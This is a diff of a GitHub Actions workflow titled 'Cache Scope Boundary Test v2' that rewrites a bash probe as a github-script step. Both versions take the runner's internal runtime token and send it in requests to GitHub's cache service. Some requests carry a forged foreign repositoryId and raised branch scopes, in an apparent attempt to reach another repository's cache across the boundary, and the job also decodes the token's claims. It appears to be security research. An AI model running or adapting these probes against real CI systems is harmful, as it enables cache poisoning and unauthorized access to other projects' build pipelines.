@@ -1,4 +1,4 @@
-name: Cache Scope Boundary Test
+name: Cache Scope Boundary Test v2
 on:
   workflow_dispatch:
 permissions:
@@ -8,62 +8,95 @@ jobs:
   cache-scope:
     runs-on: ubuntu-latest
     steps:
-      - name: Pre-cache env
-        run: |
-          echo "=== Pre-cache ACTIONS env ==="
-          env | grep "^ACTIONS_" | sed 's/=.*TOKEN.*/=***REDACTED***/' | sort
-      - uses: actions/cache@v4
+      - name: JS env probe via github-script
+        uses: actions/github-script@v7
         with:
-          path: /tmp/cache-probe
-          key: scope-probe-${{ github.run_id }}
-      - name: Post-cache scope test
-        run: |
-          echo "=== Post-cache ACTIONS env ==="
-          env | grep "^ACTIONS_" | sed 's/=.*TOKEN.*/=***REDACTED***/' | sort
-          
-          echo ""
-          echo "=== ACTIONS_RESULTS_URL ==="
-          echo "${ACTIONS_RESULTS_URL:-EMPTY}"
-          
-          echo ""
-          echo "=== ACTIONS_CACHE_URL ==="
-          echo "${ACTIONS_CACHE_URL:-EMPTY}"
-          
-          echo ""
-          echo "=== Runtime token JWT claims (header+payload only) ==="
-          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
-            echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Failed to decode"
-          fi
-          
-          echo ""
-          echo "=== Test: Cache API with modified repositoryId ==="
-          if [ -n "$ACTIONS_RESULTS_URL" ]; then
-            # Try to create a cache entry with a foreign repositoryId via twirp
-            # First, let's probe what the cache service accepts
-            TWIRP_URL="${ACTIONS_RESULTS_URL}twirp/results.api.v1.CacheService/GetCacheEntryDownloadURL"
-            echo "Twirp URL: $TWIRP_URL"
+          script: |
+            const env = process.env;
+            const actionVars = Object.keys(env)
+              .filter(k => k.startsWith('ACTIONS_'))
+              .sort()
+              .map(k => {
+                const v = env[k];
+                if (k.includes('TOKEN')) return `${k}=***REDACTED*** (len=${v.length})`;
+                return `${k}=${v}`;
+              });
+            console.log('=== ACTIONS_ env vars in JS context ===');
+            actionVars.forEach(v => console.log(v));
             
-            # Normal request (should work)
-            echo "Normal cache lookup:"
-            curl -s -w "\nHTTP:%{http_code}" \
-              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              -H "Content-Type: application/json" \
-              -X POST "$TWIRP_URL" \
-              -d '{"key":"scope-probe-test","version":"v1"}' | tail -c 300
+            const resultsUrl = env.ACTIONS_RESULTS_URL;
+            const cacheUrl = env.ACTIONS_CACHE_URL;
+            const token = env.ACTIONS_RUNTIME_TOKEN;
             
-            echo ""
-            echo "With foreign repositoryId:"
-            curl -s -w "\nHTTP:%{http_code}" \
-              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              -H "Content-Type: application/json" \
-              -X POST "$TWIRP_URL" \
-              -d '{"key":"test-key","version":"v1","metadata":{"repositoryId":1187665821,"scope":[{"scope":"refs/heads/main","permission":2}]}}' | tail -c 300
-          fi
-          
-          if [ -n "$ACTIONS_CACHE_URL" ]; then
-            echo ""
-            echo "=== v1 Cache API test ==="
-            curl -s -w "\nHTTP:%{http_code}" \
-              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" | tail -c 300
-          fi
+            if (resultsUrl) {
+              console.log('\n=== Testing v2 twirp cache API ===');
+              const twirpUrl = `${resultsUrl}twirp/results.api.v1.CacheService/GetCacheEntryDownloadURL`;
+              console.log('Twirp URL:', twirpUrl);
+              
+              // Normal request (own repo context)
+              const normalResp = await fetch(twirpUrl, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${token}`,
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({key: 'test-normal', version: 'v1'})
+              });
+              console.log('Normal request:', normalResp.status, await normalResp.text().then(t => t.substring(0, 200)));
+              
+              // Request with foreign repositoryId 
+              const foreignResp = await fetch(twirpUrl, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${token}`,
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  key: 'test-foreign',
+                  version: 'v1',
+                  metadata: {
+                    repositoryId: 1187665821,
+                    scope: [{scope: 'refs/heads/main', permission: 2}]
+                  }
+                })
+              });
+              console.log('Foreign repoId:', foreignResp.status, await foreignResp.text().then(t => t.substring(0, 200)));
+              
+              // Request with different scope
+              const scopeResp = await fetch(twirpUrl, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${token}`,
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  key: 'test-scope',
+                  version: 'v1',
+                  metadata: {
+                    scope: [{scope: 'refs/heads/production', permission: 3}]
+                  }
+                })
+              });
+              console.log('Different scope:', scopeResp.status, await scopeResp.text().then(t => t.substring(0, 200)));
+            }
+            
+            if (cacheUrl) {
+              console.log('\n=== Testing v1 cache API ===');
+              const v1Resp = await fetch(`${cacheUrl}_apis/artifactcache/caches`, {
+                headers: {'Authorization': `Bearer ${token}`}
+              });
+              console.log('v1 caches:', v1Resp.status, await v1Resp.text().then(t => t.substring(0, 200)));
+            }
+            
+            // Decode runtime token JWT to see scope claims
+            if (token) {
+              try {
+                const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+                const safePayload = {...payload};
+                delete safePayload.scp;  // Remove actual scope string
+                console.log('\n=== Runtime token JWT payload ===');
+                console.log(JSON.stringify(safePayload, null, 2));
+              } catch(e) {
+                console.log('JWT decode failed:', e.message);
+              }
+            }
